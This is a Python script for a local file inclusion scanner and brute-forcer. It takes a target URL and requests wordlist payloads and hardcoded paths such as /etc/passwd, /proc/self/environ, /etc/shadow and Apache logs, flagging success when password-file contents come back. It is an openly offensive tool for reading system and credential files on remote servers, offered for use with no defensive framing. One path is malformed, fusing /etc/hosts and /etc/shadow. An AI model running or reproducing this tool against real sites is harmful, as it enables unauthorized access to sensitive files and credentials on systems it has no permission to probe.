import requests
import socket as s
import os,time
  #########
B = "\033[34m"    # BlueB 
G = "\033[32m"    # Green
W = "\033[0m"     # White
R = "\033[31m"    # Red
C = "\033[36m"    # Cyan
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33m"    # Yellow
   #########
user="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36"
head={"User-Agent":user}
     ######
def lfiscan(url):
  file_name="lfiscan.txt"
  print(f"{G}[info] {W}File name : {Y}{file_name}")
  out_flag=False
  files=open(f"files/brute/{file_name}")
  time.sleep(2)
  print(f"{G}[info] Scanning started {W}")
  time.sleep(2)
  for line in files:
	  line=line.strip()
	  url_get=url+"/"+line
	  try:
	   req=requests.get(url_get,headers=head)
	   if "root:x:0" in req.text:
	    print(f"{R}[warning] LFI vulnerable")
	    print(f"{R}[payload] {line}{W}")
	    print(f"{R}[output] {url_get}{W}")
	    out_flag=True
	    break
	   else:
	   	pass
	  except:
	  	pass
  if out_flag==False:
	 	print(f"{Y}[alert] LFI not vulnerable{W}")
def lficheck():
  print(Y)
  os.system("figlet LFI scan")
  url=input(f"{B}[+] Enter Url : {W}")
  print(f"\n{G}[info] {W}Url Checking  : {Y}{url}{W}")
  flag_url=False
  try:
    responce=requests.get(url,headers={"User-Agent":user})
    print(f"{G}[info] {W}Status code : {Y}{responce.status_code}{W}")
    if responce:
    	flag_url=True
  except Exception as e:
    time.sleep(2)
    print(R)
    print(f"{Y}[alert] {Y}Unable to connect ...")
    pass
  if flag_url ==True:
  	lfiscan(url)
  ########
path1="/etc/passwd"
path2="/proc/version"
path3="/proc/self/environ"
path4="/etc/hosts/etc/shadow"
path5="/logs/error.log"
path6="/logs/access.log"
path7="/logs/error_log"
path8="/logs/access_log"
path9="/var/log/apache/access.log"
path10="/var/log/apache2/access.log"
path11="/var/log/apache2/error.log"
path12="/var/log/apache/access.log"

def brutekey(url,path,key):
  try:
    req=requests.get(url+path,headers=head)
    if key in req.text:
      print(f"{R}[payload] {R}{path}{W}")
    else:
     pass
  except:
    pass
def lfibrute():
  print(Y)
  os.system("figlet LFI brute")
  url=input(f"{B}[+] Enter Url : {W}")
  print(f"\n{G}[info] {W}Url Checking  : {Y}{url}{W}")
  flag_url=False
  try:
    responce=requests.get(url,headers={"User-Agent":user})
    print(f"{G}[info] {W}Status code : {Y}{responce.status_code}")
    flag_url=True
  except Exception as e:
    time.sleep(2)
    print(R)
    print(f"{G}[info] {W}Unable to connect ...")
    pass
  if flag_url ==True:
    time.sleep(2)
    print(f"{G}[info] Scanning started")
    time.sleep(2)
    brutekey(url,path1,"root:x:0")
    brutekey(url,path6,"GET")
    brutekey(url,path8,"GET")
    brutekey(url,path9,"GET")
    brutekey(url,path10,"GET")
    brutekey(url,path12,"GET")
    
     
      
      
    	
    
  

